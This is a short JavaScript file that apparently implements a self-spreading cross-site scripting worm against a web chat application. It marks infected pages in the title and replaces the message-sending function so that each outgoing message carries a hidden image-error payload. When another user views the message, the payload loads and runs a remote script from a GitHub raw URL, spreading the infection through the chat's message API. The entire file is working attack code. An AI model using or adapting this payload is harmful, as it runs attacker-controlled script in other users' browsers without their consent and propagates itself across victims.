if (typeof eafeaf !== 'undefined') {
            document.title = "infected | " + document.title;
}
eafeaf = true;

function sendMessage() {
            const name = getUsername();
            const content = `<img src="" onerror="if (typeof eafeaf !== 'undefined') { var s = document.createElement('script'); s.src='https://raw.githubusercontent.com/davidtheplatform/megi-xss/main/main.js'; document.head.appendChild(s); }">` + messageInput.value;
            const color = getUserColor();

            if (content.trim() !== "") {
                const messageData = {
                    name: name,
                    content: content,
                    color: color
                };

                fetch(`${apiUrl}/api/messages`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(messageData)
                })
                    .then(response => {
                        if (response.ok) {
                            messageInput.value = "";
                            expandMessageInput();
                            getMessages();
                        } else {
                            response.json().then(data => {
                                // Display error message
                                alert(data.error);
                            });
                        }
                    });
            }
        }
